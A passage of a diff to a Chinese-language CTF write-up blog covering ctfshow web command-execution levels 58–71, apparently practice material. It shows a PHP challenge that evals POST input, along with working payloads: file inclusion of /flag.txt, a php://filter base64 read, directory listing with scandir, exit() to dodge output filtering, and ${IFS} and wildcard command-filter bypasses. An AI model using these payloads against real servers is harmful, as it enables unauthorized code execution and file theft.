+  string(3) &quot;run&quot;
+  [15]&#x3D;&gt;
+  string(4) &quot;sbin&quot;
+  [16]&#x3D;&gt;
+  string(3) &quot;srv&quot;
+  [17]&#x3D;&gt;
+  string(3) &quot;sys&quot;
+  [18]&#x3D;&gt;
+  string(3) &quot;tmp&quot;
+  [19]&#x3D;&gt;
+  string(3) &quot;usr&quot;
+  [20]&#x3D;&gt;
+  string(3) &quot;var&quot;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>1·payload<code>c=include(&#39;/flag.txt&#39;);echo $flag;</code></p>
+<p>2·payload<code>c=include(&#39;php://filter/convert.base64-encode/resource=/flag.txt&#39;);</code>,然后base64解码</p>
+<p>3.payload<code>c=include(&#39;/flag.txt&#39;);var_dump(get_defined_vars());</code></p>
+<h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><p>打开以后只有</p>
+<pre class="line-numbers language-none"><code class="language-none">Warning: error_reporting() has been disabled for security reasons in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 14
+
+Warning: ini_set() has been disabled for security reasons in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 15
+
+Warning: highlight_file() has been disabled for security reasons in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 24
+你要上天吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>附件源代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/</span>
+
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// 你们在炫技吗？</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span>
+
+<span class="token delimiter important">?></span></span>
+
+你要上天吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<p>看到过滤了更多，于是使用<code>mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</code>，发现可以执行，在访问a.txt拿到flag</p>
-<p>解法二：</p>
-<p>​    payload <code>?c=/bin/?at$&#123;IFS&#125;f???????</code></p>
+<p>同上，只不过要是脚本跑一下目录，然后结束时加一个exit();</p>
+<p>跑目录的Payload<code>c=for($i=0;$i&lt;=40;$i%2B%2B)&#123;echo scandir(&#39;/&#39;)[$i].&#39;&lt;br&gt;&#39;;&#125;exit();</code></p>
+<p>1·payload<code>c=include(&#39;/flag.txt&#39;);echo $flag;eixt();</code></p>
+<p>2·payload<code>c=include(&#39;php://filter/convert.base64-encode/resource=/flag.txt&#39;);eixt();</code>,然后base64解码</p>
+<p>3.payload<code>c=include(&#39;/flag.txt&#39;);var_dump(get_defined_vars());</code>eixt();</p>
 
                 
             </div>
@@ -655,7 +870,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://rolemee.com/2021/07/15/ctfshow-web-ru-men-ming-ling-zhi-xing-51-54/">https://rolemee.com/2021/07/15/ctfshow-web-ru-men-ming-ling-zhi-xing-51-54/</a>
+                    <a href="https://rolemee.com/2021/07/16/ctfshow-web-ru-men-ming-ling-zhi-xing-58-71/">https://rolemee.com/2021/07/16/ctfshow-web-ru-men-ming-ling-zhi-xing-58-71/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -870,17 +1085,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/07/15/ctfshow-web-ru-men-ming-ling-zhi-xing-55-57/">
+                <a href="/2021/07/16/ctfshow-web-ru-men-ming-ling-zhi-xing-58-71/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="ctfshow-web入门-命令执行-55-57">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="ctfshow-web入门-命令执行-58-71">
                         
-                        <span class="card-title">ctfshow-web入门-命令执行-55-57</span>
+                        <span class="card-title">ctfshow-web入门-命令执行-58-71</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -890,9 +1106,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -905,6 +1121,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -927,13 +1144,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/14/ctfshow-web-ru-men-ming-ling-zhi-xing-41-50/">
+                <a href="/2021/07/15/ctfshow-web-ru-men-ming-ling-zhi-xing-55-57/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="ctfshow-web入门-命令执行 41-50">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="ctfshow-web入门-命令执行-55-57">
                         
-                        <span class="card-title">ctfshow-web入门-命令执行 41-50</span>
+                        <span class="card-title">ctfshow-web入门-命令执行-55-57</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -944,7 +1161,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-15
                             </span>
                         <span class="publish-author">
                             
